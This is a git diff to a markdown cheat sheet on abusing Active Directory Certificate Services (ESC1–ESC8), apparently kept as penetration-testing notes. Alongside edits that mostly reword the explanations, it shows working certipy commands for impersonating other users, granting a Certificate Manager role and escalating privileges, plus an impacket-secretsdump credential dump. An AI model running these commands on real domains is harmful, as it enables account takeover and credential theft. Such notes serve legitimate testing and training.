@@ -6,7 +6,7 @@ Note CA name/FQDN, template, publication, enrollment/edit rights, SID.
 certipy find -u <USER>@<DOMAIN.TLD> -p '<PW>' -dc-ip <DC-IP> -vulnerable -stdout
 ```
 - Every `certipy` command below also takes `-hashes [<LM>:]<NT>` (bare `<NT>` works, or `:<NT>` with an empty LM) and `-k -no-pass` (Kerberos ccache) instead of `-p`.
-- `-ns <DC-IP>`: Kali's own resolver usually can't resolve the CA host by name — add it so `certipy` can reach the CA at all.
+- `-ns <DC-IP>`: Kali's resolver usually can't resolve the CA host by name. Add it so `certipy` can reach the CA.
 
 ## ESC1
 Needs enrollee-supplied SAN, an authentication EKU, enrollment rights, publication by the CA, no manager approval / authorized-signature requirement.
@@ -22,11 +22,11 @@ certipy auth -pfx <FILE>.pfx -dc-ip <DC-IP> -no-hash -no-save
 - Schannel has its own mapping / trust prerequisites.
 
 ## ESC2 (Any Purpose / no EKU)
-Template defines no EKU, or explicit "Any Purpose" — the resulting cert (for whatever identity you can get into it) isn't restricted to client-auth the way ESC1's check expects:
+Template defines no EKU, or explicit "Any Purpose": the resulting cert (for whatever identity you can get into it) isn't restricted to client auth the way ESC1's check expects:
 ```bash
 certipy req -u <USER>@<DOMAIN.TLD> -p '<PW>' -ca <CA-NAME> -template <TEMPLATE>
 ```
-- On its own this only gets a cert for *your own* identity — still useful (PKINIT as yourself where that's otherwise blocked). Combined with ESC1's enrollee-supplied-SAN flaw on the same template, use the ESC1 command above with `-upn`/`-sid` instead. Combined with no other restriction, the cert can also stand in for ESC3's agent cert.
+- On its own this only gets a cert for *your own* identity. Still useful for PKINIT as yourself where that's otherwise blocked. With ESC1's enrollee-supplied SAN on the same template, use the ESC1 command above with `-upn`/`-sid`. With no other restriction, the cert can also stand in for ESC3's agent cert.
 
 ## ESC3 (Certificate Request Agent)
 Needs: a template that issues an enrollment-agent cert (Certificate Request Agent EKU), then a *second* template enrollable on-behalf-of others:
@@ -34,14 +34,14 @@ Needs: a template that issues an enrollment-agent cert (Certificate Request Agen
 certipy req -u <USER>@<DOMAIN.TLD> -p '<PW>' -ca <CA-NAME> -template <AGENT-TEMPLATE>
 certipy req -u <USER>@<DOMAIN.TLD> -p '<PW>' -ca <CA-NAME> -template <TARGET-TEMPLATE> -on-behalf-of '<DOMAIN>\<TARGET-USER>' -pfx <AGENT>.pfx
 ```
-- First command gets the agent cert; second uses it to request as `<TARGET-USER>` with no SAN needed — the agent cert itself carries the impersonation.
+- First command gets the agent cert; second uses it to request as `<TARGET-USER>`. No SAN needed: the agent cert carries the impersonation.
 
 ## ESC7 (ManageCA / Certificate Manager)
 Needs: `Manage CA` or `Manage Certificates` right on the CA object itself (not a template):
 ```bash
 certipy ca -u <USER>@<DOMAIN.TLD> -p '<PW>' -ca <CA-NAME> -add-officer <USER>
 ```
-- Makes `<USER>` a Certificate Manager, which can approve a pending request (`-issue-request <REQUEST-ID>`) on a template that normally needs manager approval — chain with ESC1/ESC4 on a template that's otherwise correct except for the approval requirement.
+- Makes `<USER>` a Certificate Manager, who can approve a pending request (`-issue-request <REQUEST-ID>`) on a template that needs manager approval. Chain with ESC1/ESC4 on a template whose only blocker is that approval.
 
 ## ESC4 (write access to the template)
 Save the original first (Certipy 5 flags; older guides use `-save-old`):
@@ -71,20 +71,20 @@ export KRB5CCNAME=<USER>.ccache
 impacket-secretsdump -k -no-pass -dc-ip <DC-IP> -target-ip <DC-IP> -just-dc-user <TARGET-USER> '<DOMAIN.TLD>/<USER>@<DC-FQDN>'
 ```
 - The group SID lives only in the TGT (ccache): the NT hash `auth` prints is your own and carries no extra rights.
-- `secretsdump` only works if the linked group has DCSync — check what it can do *before* assuming that.
+- `secretsdump` only works if the linked group has DCSync. Check what the group can do first.
 - No SAN needed: you stay yourself, plus the linked group.
 
 ### Finding what the linked group can do
-BloodHound shows no path here — the membership only exists inside the TGT, never written to AD, so BloodHound's collected data has nothing to show. Compare writable-object access with and without the ticket:
+BloodHound shows no path here: the membership exists only inside the TGT and is never written to AD. Compare writable-object access with and without the ticket:
 ```bash
 bloodyAD --host <DC-FQDN> -d <DOMAIN.TLD> -k get writable        # KRB5CCNAME set: you + the linked group
 bloodyAD --host <DC-FQDN> -d <DOMAIN.TLD> -u <USER> -p '<PW>' get writable   # plain user: baseline
 ```
-- Diff the two outputs — anything only in the Kerberos run is what the linked group actually grants.
-- `certipy find -oids` can list several issuance policies with similar/identical display names; only the one whose entry shows `Linked Group` is the one that matters here — don't assume the first match.
+- Diff the two outputs. Anything only in the Kerberos run comes from the linked group.
+- `certipy find -oids` can list several issuance policies with similar or identical display names. Use the one whose entry shows `Linked Group`, not the first match.
 
 ## ESC8
-Live relay to the enrollment endpoint → [ntlm-relay](ntlm-relay.md#ad-cs-relay-esc8). A captured NetNTLM file is not enough.
+Live relay to the enrollment endpoint → [ntlm-relay](ntlm-relay.md#ad-cs-relay-esc8). A captured NetNTLM file is not enough. DC source → `DomainController` template.
 
 ## When certipy req fails
 | Error | Fix |
